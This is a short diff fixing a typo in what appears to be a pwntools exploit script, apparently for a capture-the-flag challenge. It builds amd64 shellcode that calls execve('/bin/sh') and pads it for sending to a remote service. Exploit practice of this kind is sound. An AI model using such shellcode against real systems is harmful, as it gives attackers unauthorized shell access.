@@ -32,7 +32,7 @@ p = remote(...)
 context.log_level = "debug"
 context.arch = "amd64"
 
-shellcode = asm(shellcratf.amd64.sh())
+shellcode = asm(shellcraft.amd64.sh())
 #调用 execve("/bin/sh") 的 amd64 shellcode
 shellcode = shellcode.ljust(256,b'A')
 
